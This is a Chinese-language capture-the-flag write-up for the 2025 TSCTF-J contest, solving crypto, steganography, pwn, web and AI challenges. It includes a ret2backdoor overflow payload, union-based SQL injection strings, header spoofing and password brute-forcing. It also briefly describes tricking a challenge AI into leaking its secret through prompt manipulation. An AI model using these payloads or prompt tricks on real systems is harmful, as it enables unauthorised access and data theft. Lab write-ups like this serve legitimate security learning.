---
title: 2025 TSCTF-J WP
abbrlink: 4c9af485
tags: 
 - CTF
 - wp
date: 2025-10-28 
categories: 
 - wp
---
## AI:
### Coup
给出前中后期策略，然后开roll
策略：前期苟，中期挑软柿子打，后期有把握就开
原文：Early on, prioritize safe income generation or using the Duke's Tax for economy, while avoiding unnecessary bluffs. As funds reach 7-9, leverage Coups or Assassinations to target the weakest opponent , accelerating the game to a one-on-one scenario. Maintain resource control to avoid forced Coups at 10, and use challenges sparingly based on opponent patterns—challenge only when bluff probability is high. In late game, concentrate attacks on the remaining player, balancing aggression with survival; for instance, bluff cautiously in head-to-head situations due to higher challenge risks.

### ThreeFairy Tales
误打误撞，反提示操作，将执剑人temperature拉到70，将情报变成每个字藏在每句话第二个字的一段话，结果ai把输入的话又输出了，通过

---

## Crypto：
### Cantor’s_gift
康托展开数，逐除（n-1-i）！得到打乱序列，还原字符串
数字符串长度得到n=37
初始化

	factorials=[1]*n
		if n>1:
			temp_fact=1
			for i in range(1,n):
				temp_fact*=i
				factorials[i]=temp_fact
		avail=list(range(1,n+1))
	perm=[]
	X=cantor_num

还原康托展开，还原随机排序
	for i in range(n):
		fact_val=factorials[n-1-i]
		index=X//fact_val
		X=X%fact_val
		element=avail.pop(index)
		perm.append(element)

排序反向，还原字符串

	inverse_perm=[0]*len(perm)
	for pos,val in enumerate(perm):inverse_perm[val-1]=pos+1//反向
	Flag=bytearray(len(hint2))
		for i in range(len(hint2)):
			Flag[i]=hint2[inverse_perm[i]-1]

### sign_in
异或回去，恢复flag base64解码
将字符串转成整型

	key1=int(KEY1,16)
	key2_xor_key1=int(KEY2_XOR_KEY1,16)
	key2_xor_key3=int(KEY2_XOR_KEY3,16)
	flag_xor_all=int(FLAG_XOR_ALL,16)

异或回去

	Key2=key2_xor_key1^key1
	key3=key2^key2_xor_key3
	m=flag_xor_all^key1^key2^key3

转回字符串

	hex_str=hex(m)[2:]
	flag_byte=bytes.fromhex(hex_str)
	flag=base64.b64decode(flag_bytes).decode('utf-8')


### p=~q

	p，q类似取反，q+p=3*2**1023
	设：p=2^(1023)+a*2+1
	q=2^(1023)+ b*2 1   
	b=(2^1022-1)-a

带入n解方程得到p，q

	s=3*(1<<1023)
	D=s*s-4*n
	sqrt_D=math.isqrt(D)
	p=(s+sqrt_D)//2
	q=(S-sqrt_D)//2
	计算私钥，d=pow(e,-1,(p-1)(q-1))
	phi=(p-1)*(q-1)
	d=pow(e,-1,phi)
	解密m=pow(c,d,n)
	m=pow(c,d,n)
	flag=long_to_bytes(m)

### 野狐禅
Paillier加密
还原计算得到y

	y_vals=[]
	for i in range(150):
		c_i=ciphertexts[i]
	raw_i=lcg_raws[i]
	r_i=raw_i%n
		t_i=pow(r_i,n,n2)
		inv_t_i=pow(t_i,-1,n2)
		z_i=(c_i*inv_t_i)%n2
		m_val_i=(z_i-1)//n
		y_vals.append(m_val_i)

构建线性关系求解

	b=y_vals[k:2*k]
	A =[]
		for i in range(k):
	row=[]
			for j in range(k):
	index=k+i-1-j
			row.append(y_vals[index])
		A.append(row)
	A_matrix=Matrix(A)
	b_vector=Matrix(b）
	c_vector=A_matrix.solve(b_vector)
	coeffs=[int(c)for c in c_vector]

还原flag

	n_flag=sum(coeffs[j]*(3**j)for j in range(k))
	flag_bytes = long_to_bytes(n_flag)

---

## misc
### BadFile
打开txt和wav分析需要找出的文件需要找出个人信息，pdf则在010中分析，发现加入了类似网站源码的编码，Txt和wav硬翻，pdf取了内存最大的五个

### Meow
根据010打开得到的提示调整解码方式，a-zA-Z0-+/=，根据绿色深浅调整字符串排序在Cyberchef中解码得到

### 卢森堡的秘密
卢森堡的首字母就是lsb，简单Lsb隐写

---

## Pwn
### Ret
打开ida找到/bin/sh地址0x400794
backdoor函数地址：0x400676
找到vul函数，得到需要填充缓冲区16+rbp 8字节
根据提示找到ret地址0x4006b6，栈对齐
提交payload2 =b'A'*offset+p64(ret)+p64(backdoor)
填充缓冲区+栈平衡+backdoor地址

---

## Web
### Druid
根据提示/Druid 
随便试账号和密码，admin admin过了

### EZ_login
根据提示加X-Forward伪造本地管理员
然后burpsuit爆破得到密码simple

### EZ_SQL
查询返回几列数据 1’ ORDER BY 3 -- 成功 4 失败
联合查询
1' UNION SELECT 1,2,3 -- 
CONVERT把第一个flag变成 flag USING utf8
1' UNION SELECT 1,CONVERT(flag USING utf8), 3 FROM flag -- 